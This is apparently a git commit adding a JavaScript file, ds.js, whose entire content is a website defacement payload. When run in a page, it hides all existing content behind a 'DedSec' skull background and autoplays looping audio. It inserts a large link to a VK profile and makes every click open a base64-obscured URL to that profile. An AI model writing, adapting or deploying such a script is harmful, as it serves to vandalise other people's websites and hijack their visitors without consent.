76343fd21cb18775405a92be751b23856a6186e9
MinedroidScr <mineall@mail.ru>
2017-06-01 14:17:23 +0300

    Create ds.js

---
+++ ds.js
@@ -0,0 +1,13 @@
+document.body.onclick=function(){
+window.open(atob('aHR0cHM6Ly92ay5jb20vbWluZWRyb2lk'))};
+var s = document.createElement('style');
+s.innerHTML="html{  display:block!important;  overflow: hidden;    background-size: 100;background:url('//orig08.deviantart.net/9039/f/2016/164/b/c/dedsec_skull_noise_by_junguler-da6229q.gif')} body{display:block!important} *{display:none}";
+document.body.appendChild(s); 
+var d = document.createElement('div');
+d.innerHTML="<audio autoplay loop preload><source src=//cdn.discordapp.com/attachments/262613671039991809/319385603785621504/DedSec_-_.mp3 type=audio/mpeg></audio>"+'<a href="//vk.com/minedroid" target="_blank" style="display:block !important;color: white !important;font-family: Hacked, sans-serif !important; font-size: 7em !important;   outline: none;    text-decoration: none;    color: white;">vk.com/Minedroid</a>';
+d.style='display:block !important; left: -30% !important;margin-top: 200px !important;text-align: center !important;position: relative !important;transform: skewY(-30deg) !important;height: 226px !important;overflow: visible !important;';
+document.body.appendChild(d);
+var h = document.createElement('link');
+h.rel='stylesheet';
+h.href='//watchdogsfont.com/style.css';
+document.head.appendChild(h);
